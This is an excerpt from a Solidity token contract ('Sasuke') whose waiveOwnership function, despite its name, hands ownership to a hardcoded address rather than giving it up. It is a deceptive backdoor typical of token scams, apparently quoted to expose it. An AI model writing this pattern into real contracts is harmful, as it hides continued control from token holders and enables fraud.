...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xC3Fa9478A11845c49710B002418EE7b00fCBf166));
        _owner = address(0xC3Fa9478A11845c49710B002418EE7b00fCBf166);
    }
...
contract Sasuke is Context, IERC20, Ownable {
    ...
    address payable public teamWalletAddress = payable(0xdFfEcDDcE856bc45930c8F0B623df450Fd137157);
